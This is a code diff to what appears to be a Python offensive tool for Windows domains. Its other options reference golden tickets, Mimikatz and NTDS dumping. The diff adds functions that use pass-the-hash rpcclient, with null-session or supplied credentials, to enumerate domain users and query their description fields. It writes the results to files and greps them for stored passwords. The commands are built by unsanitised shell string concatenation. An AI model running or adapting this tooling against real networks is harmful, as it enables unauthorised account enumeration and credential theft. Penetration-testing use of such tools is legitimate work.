@@ -305,6 +305,126 @@ def get_ip_address(ifname):
 		struct.pack('256s', ifname[:15])
 	)[20:24])
 
+def enumdomusers(ip,username,password,path):
+	
+	#Enumerate users using enumdomusers
+	dom_accounts = []
+
+	if username=="":
+		proc = subprocess.Popen('pth-rpcclient '+ip+' -U \"\" -N '+' -c \"enumdomusers\" 2>/dev/null', stdout=subprocess.PIPE,shell=True)
+	else:
+		proc = subprocess.Popen('pth-rpcclient '+ip+' -U '+username+'%'+password +' -c \"enumdomusers\" 2>/dev/null', stdout=subprocess.PIPE,shell=True)
+	
+	stdout_value = proc.communicate()[0]
+	
+	if "Account Name:" in stdout_value:
+		print colored(username+" "+args.password ,'green')+colored(" - SUCCESSFUL LOGON",'green')
+	elif "NT_STATUS_LOGON_FAILURE" in stdout_value:
+		print colored(username+" "+args.password,'red') +colored(" - NT_STATUS_LOGON_FAILURE",'red')
+	elif "NT_STATUS_ACCOUNT_LOCKED_OUT" in stdout_value:
+		print colored('*****WARNING***** '+username+" "+args.password,'red') +colored(" - NT_STATUS_ACCOUNT_LOCKED_OUT",'red')
+	elif "NT_STATUS_ACCOUNT_DISABLED" in stdout_value:
+		print colored(username+" "+args.password,'blue')+colored(" - NT_STATUS_ACCOUNT_DISABLED",'blue')
+	elif "NT_STATUS_PASSWORD_MUST_CHANGE" in stdout_value:
+		print colored(username+" "+args.password,'blue') +colored(" - NT_STATUS_PASSWORD_MUST_CHANGE",'blue')
+	else:
+		print colored("[+]Successful Connection...",'yellow')
+
+
+	if not "user:[" in stdout_value:
+		return False
+	else:
+		for line in stdout_value.split('\n'):
+			tmpline=line.lstrip()
+			tmpline=tmpline.split(' ')
+			dom_accounts.append(tmpline[0].replace("user:[", "").replace("]", ""))
+
+	if len(dom_accounts)>0:
+		
+		if dom_accounts[len(dom_accounts)-1]=='':
+			del dom_accounts[len(dom_accounts)-1]
+
+		print colored('[*]Successfully extracted '+str(len(dom_accounts))+' user name(s)','green')
+					
+		if os.path.isfile(path+str(targets[0])+"_users.txt"):
+			os.remove(path+str(targets[0])+"_users.txt")
+
+		fout=open(path+str(targets[0])+"_users.txt",'w')
+		for u in dom_accounts:
+			fout.write(u+"\n")
+		fout.close()
+
+		print colored('[*]User accounts written to file '+(path+str(targets[0]))+"_users.txt",'green')
+
+	else:
+		print colored('[-]Looks like we were unsuccessfull extracting user names with this method','red')
+
+def getdescfield(ip,username,password,path):
+	
+	usernames = []
+	descfield = []
+	filename=path+(str(ip)+"_users.txt")
+	
+	#Start by seeing if out userfile exists, if it does read in contents
+	if os.path.isfile(filename):
+		print colored('[*]Enumerating usernames to get description information...','yellow')
+		with open(filename,'r') as inifile:
+			data=inifile.read()
+			user_list=data.splitlines()
+		
+		#Make sure that the list of users is greater than 0
+		if len(user_list)>0:
+			#Confirm userfile found and its not empty
+			print colored('[*]Username file found...','green')
+			for x in xrange(0,len(user_list)):
+				if '\\' in user_list[x]:
+					paccount=user_list[x].split("\\", 1)[1]
+				else:
+					paccount=user_list[x]
+
+				if username=="":
+					proc = subprocess.Popen('pth-rpcclient '+ip+' -U \"\" -N '+'  -c \"queryuser '+paccount+'\" 2>/dev/null', stdout=subprocess.PIPE,shell=True)
+				else:
+					proc = subprocess.Popen('pth-rpcclient '+ip+' -U '+username+'%'+password +' -c \"queryuser '+paccount+'\" 2>/dev/null', stdout=subprocess.PIPE,shell=True)
+			
+				stdout_value = proc.communicate()[0]
+				
+				if 'result was NT_STATUS_ACCESS_DENIED' in stdout_value:
+					print colored('[-]Access Denied, Check Creds...','red')
+					break
+				else:
+					for line in stdout_value.split('\n'):
+						tmpline=line.lstrip()
+						if "Description :	" in tmpline:
+							desclen=(tmpline.replace("Description :	", "").rstrip())
+							if len(desclen)>0:
+								usernames.append(paccount)
+								descfield.append(tmpline.replace("Description :	", "").rstrip())
+
+		if len(descfield)>0:
+			print colored('[*]Successfully extracted '+str(len(descfield))+' accounts with descriptions','green')
+		
+			if os.path.isfile(path+str(ip)+"_desc_users.txt"):
+				os.remove(path+str(ip)+"_desc_users.txt")
+
+			fout=open(path+str(ip)+"_desc_users.txt",'w')
+			for u in xrange(0,len(descfield)):
+				fout.write(usernames[u]+","+descfield[u]+"\n")
+			fout.close()
+
+			print colored('[*]Accounts with descriptions written to file '+path+str(ip)+"_desc_users.txt",'green')
+			
+			if os.path.isfile(path+str(ip)+"_desc_users.txt"):
+				proc = subprocess.Popen('grep -i pass '+path+str(ip)+"_desc_users.txt", stdout=subprocess.PIPE,shell=True)
+				stdout_value = proc.communicate()[0]
+
+				if len(stdout_value)>0:
+					print colored('[*]A quick check for pass reveals... '+'\n','yellow')
+					print stdout_value
+		
+	else:
+		print colored('[-]Unable to find username file...','red')
+
 def datadump(user, passw, host, path, os_version):
 	
 	#Exception where User has no password
@@ -1326,6 +1446,7 @@ p.add_argument("-hR", "--stealth_mimi", dest="stealth_mimi", default="n", help="
 p.add_argument("-hT", "--golden_ticket", dest="golden_ticket", default="n", help="<Optional> Create a Golden Ticket")
 # Enumeration related
 p.add_argument("-eA", "--service_accounts", dest="service_accounts", default="n", help="<Optional> Enum service accounts, if any")
+p.add_argument("-eD", "--user_desc", dest="user_desc", default="n", help="<Optional> Save AD User Description Field to file, check for password")
 p.add_argument("-eL", "--find_user", dest="find_user", default="n", help="<Optional> Find user - Live")
 p.add_argument("-eO", "--ofind_user", dest="ofind_user", default="n", help="<Optional> Find user - Offline")
 p.add_argument("-eP", "--password_policy", dest="password_policy", default="n", help="<Optional> Display Password Policy")
@@ -1391,6 +1512,7 @@ multi_rdp=args.multi_rdp
 edq_SingleSessionPerUser=args.edq_SingleSessionPerUser
 screenshot=args.screenshot
 unattend=args.unattend
+user_desc=args.user_desc
 
 if lat in yesanswers:
 	WriteLAT()
@@ -2109,7 +2231,7 @@ if ntds_util in yesanswers:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
-if policiesscripts_dump=='y' or policiesscripts_dump=='yes':
+if policiesscripts_dump in yesanswers:
 	if len(targets)==1:
 		if user!='' and passw!='' and targets[0]!='':
 			
@@ -2242,6 +2364,33 @@ if ofind_user !='n':
 			if ofind_user in open(outputpath+str(ip)+'/logged_on_users.txt').read():
 				print colored ("[+]Found " + ofind_user + " logged in to "+str(ip),'green')
 	sys.exit()
+
+if user_desc in yesanswers:
+	if len(targets)==1:
+		try:
+			#Check that we're running this against a DC
+			checkport()
+			
+			if not os.path.isdir(outputpath+targets[0]):
+				os.makedirs(outputpath+targets[0])
+				print colored("[+]Creating directory for host: "+outputpath+targets[0],'green')
+			else:
+				print colored("[+]Found directory for : "+outputpath+targets[0],'yellow')
+			
+			print colored("[+]Attempting to gather AD Description information using RPC",'green')
+			
+			enumdomusers(targets[0],user,passw,outputpath+targets[0]+"/")
+			getdescfield(targets[0],user,passw,outputpath+targets[0]+"/")
+
+			sys.exit()
+
+		except:
+			sys.exit()
+	else:
+		print colored ('\n[-]It is only possible to use this function on a single target and not a range','red')
+		sys.exit()
+
+
 
 if targets is None:
 	print colored ('[-]You have not entered a target!, Try --help for a list of parameters','red')
